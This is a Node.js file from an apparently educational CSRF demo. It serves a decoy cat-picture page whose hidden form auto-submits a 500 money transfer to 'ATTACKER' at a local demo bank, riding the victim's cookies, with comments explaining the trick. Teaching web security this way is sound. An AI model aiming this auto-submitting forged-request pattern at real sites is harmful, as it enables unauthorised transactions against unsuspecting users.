// ---------- CSRF demo: THE ATTACKER'S SITE ----------
//
// Looks like an innocent page, but it secretly auto-submits a money-transfer
// form to the bank. Because your browser auto-attaches your bank cookie, the
// bank thinks YOU made the transfer.
//
// Run it:  node evil.js   then open http://localhost:7002 while logged into the bank.

const express = require("express");
const app = express();

const PORT = 7002;

app.get("/", (req, res) => {
  res.send(`
    <h2>😺 Free Cute Cat Pictures!</h2>
    <p>Enjoy these free cats while we definitely don't do anything sneaky...</p>

    <!-- The hidden CSRF attack: a transfer form aimed at YOUR bank. -->
    <form id="attack" action="http://localhost:7001/transfer" method="POST">
      <input type="hidden" name="to" value="ATTACKER">
      <input type="hidden" name="amount" value="500">
    </form>

    <script>
      // Auto-submit the moment the page loads. The victim does nothing.
      document.getElementById("attack").submit();
    </script>
  `);
});

app.listen(PORT, () => {
  console.log(`😈 Evil site running on http://localhost:${PORT}`);
  console.log("   Open it in a browser WHILE logged into the bank.");
});
